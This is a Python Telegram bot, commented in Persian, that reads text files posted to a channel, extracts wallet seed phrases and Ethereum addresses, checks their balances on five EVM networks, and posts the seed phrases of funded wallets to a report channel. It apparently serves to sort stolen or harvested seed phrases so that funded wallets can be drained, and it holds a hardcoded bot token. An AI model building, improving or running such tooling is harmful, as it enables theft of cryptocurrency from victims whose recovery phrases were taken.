import os
import re
import asyncio
import threading
from flask import Flask
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, filters
from web3 import Web3
from keep_alive import keep_alive

# --- تنظیمات ---
BOT_TOKEN = '8668017334:AAHMHyPg_LAlYtzlcggKGhBjbGHXNLspylk'
SOURCE_CHANNEL_ID = '@rrxfq'
REPORT_CHANNEL_ID = '@regroupmywallet'

NETWORKS = {
    'ETH': 'https://eth.llamarpc.com',
    'BSC': 'https://bsc-dataseed.binance.org/',
    'POLYGON': 'https://polygon-rpc.com',
    'ARB': 'https://arb1.arbitrum.io/rpc',
    'OP': 'https://mainnet.optimism.io'
}

def check_all_balances(address):
    found_assets = []
    for name, rpc in NETWORKS.items():
        try:
            w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={'timeout': 5}))
            checksum_addr = Web3.to_checksum_address(address.strip())
            bal_wei = w3.eth.get_balance(checksum_addr)
            if bal_wei > 0:
                amount = float(w3.from_wei(bal_wei, 'ether'))
                found_assets.append({'network': name, 'amount': amount})
        except: continue
    return found_assets

async def process_report_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.channel_post or not update.channel_post.document:
        return

    doc = update.channel_post.document
    if not doc.file_name.endswith('.txt'): return

    file = await context.bot.get_file(doc.file_id)
    content_bytes = await file.download_as_bytearray()
    content = content_bytes.decode('utf-8', errors='ignore')

    # استخراج عبارت‌ها و آدرس‌ها با الگوی جدید (تطبیق با فایل ارسالی شما)
    phrases = re.findall(r"Phrase:\s*(.*?)\s*(?:\[|Addr:|$)", content, re.DOTALL)
    addresses = re.findall(r"Addr:\s*(0x[a-fA-F0-9]{40})", content)

    wallets = list(zip(phrases, addresses))
    
    if not wallets:
        await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=f"❌ در فایل `{doc.file_name}` هیچ کیف پولی یافت نشد.")
        return

    total_summary = {net: 0.0 for net in NETWORKS.keys()}
    rich_details = ""
    any_balance = False

    for phrase, addr in wallets:
        clean_phrase = phrase.strip().replace('\n', ' ')
        assets = check_all_balances(addr)
        
        if assets:
            any_balance = True
            wallet_info = f"\n💎 **Rich Wallet Found:**\n🔑 `{clean_phrase}`\n📍 `{addr}`\n"
            for asset in assets:
                total_summary[asset['network']] += asset['amount']
                wallet_info += f"   - {asset['network']}: `{asset['amount']:.6f}`\n"
            rich_details += wallet_info

    # --- ساخت پیام نهایی ---
    summary_msg = f"📂 **File:** `{doc.file_name}`\n"
    summary_msg += f"🔢 Wallets: {len(wallets)}\n"
    summary_msg += "💰 **Total File Balance:**\n"
    
    for net, total in total_summary.items():
        summary_msg += f"   - {net}: `{total:.6f}`\n"

    # ارسال گزارش جمع کل (حتی اگر صفر باشد)
    await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=summary_msg, parse_mode='Markdown')

    # ارسال جزئیات کیف‌های پول‌دار (اگر وجود داشتند)
    if any_balance:
        # اگر متن خیلی طولانی بود، تکه تکه ارسال شود
        if len(rich_details) > 4000:
            for i in range(0, len(rich_details), 4000):
                await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=rich_details[i:i+4000], parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=rich_details, parse_mode='Markdown')

if __name__ == '__main__':
    keep_alive() # اجرای وب‌سرویس از فایل keep_alive.py
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(MessageHandler(filters.ChatType.CHANNEL & filters.Document.ALL, process_report_file))
    application.run_polling()
